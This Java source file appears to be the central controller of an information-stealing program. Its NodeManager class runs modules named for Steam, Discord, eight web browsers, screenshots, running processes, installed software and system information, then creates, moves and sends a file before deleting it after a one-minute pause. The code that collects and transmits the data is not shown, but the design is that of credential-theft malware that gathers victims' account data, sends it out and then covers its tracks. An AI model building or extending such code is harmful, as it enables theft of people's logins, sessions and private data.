package _256.node;

import java.util.ArrayList;
import java.util.List;

import _256.node.nodes.file.CreateFile;
import _256.node.nodes.file.DeleteFile;
import _256.node.nodes.file.MoveFile;
import _256.node.nodes.file.SendFile;
import _256.node.nodes.impl.Information;
import _256.node.nodes.impl.Properties;
import _256.node.nodes.impl.Screenshot;
import _256.node.nodes.impl.Softwares;
import _256.node.nodes.impl.app.Discord;
import _256.node.nodes.impl.app.Steam;
import _256.node.nodes.impl.Process;
import _256.node.nodes.impl.browser.Brave;
import _256.node.nodes.impl.browser.Chrome;
import _256.node.nodes.impl.browser.Edge;
import _256.node.nodes.impl.browser.Firefox;
import _256.node.nodes.impl.browser.Opera;
import _256.node.nodes.impl.browser.OperaGX;
import _256.node.nodes.impl.browser.Vivaldi;
import _256.node.nodes.impl.browser.Yandex;

public class NodeManager {
	private Information information;
	private Steam steam;
	private Discord discord;
	private Process process;
	private Properties properties;
	private Screenshot screenshot;
	private Softwares softwares;
	private CreateFile createFile;
	private Brave brave;
	private Chrome chrome;
	private Edge edge;
	private Firefox firefox;
	private Opera opera;
	private OperaGX operagx;
	private Vivaldi vivaldi;
	private Yandex yandex;
	private MoveFile moveFile;
	private SendFile sendFile;
	private DeleteFile tempFile;
	public List<Node> nodes = new ArrayList<>();

	public void start() throws InterruptedException {
		steam = new Steam();
		discord = new Discord();
		process = new Process();
		properties = new Properties();
		screenshot = new Screenshot();
		softwares = new Softwares();
		createFile = new CreateFile();
		brave = new Brave();
		chrome = new Chrome();
		edge = new Edge();
		firefox = new Firefox();
		opera = new Opera();
		operagx = new OperaGX();
		vivaldi = new Vivaldi();
		yandex = new Yandex();
		information = new Information();
		moveFile = new MoveFile();
		sendFile = new SendFile();
		Thread.sleep(60000);
		tempFile = new DeleteFile();
	}

	public void launch() throws InterruptedException {
		start();
		nodes.add(steam);
		nodes.add(discord);
		nodes.add(process);
		nodes.add(properties);
		nodes.add(screenshot);
		nodes.add(softwares);
		nodes.add(createFile);
		nodes.add(brave);
		nodes.add(chrome);
		nodes.add(edge);
		nodes.add(firefox);
		nodes.add(opera);
		nodes.add(operagx);
		nodes.add(vivaldi);
		nodes.add(yandex);
		nodes.add(information);
		nodes.add(moveFile);
		nodes.add(sendFile);
		nodes.add(tempFile);
	}
}
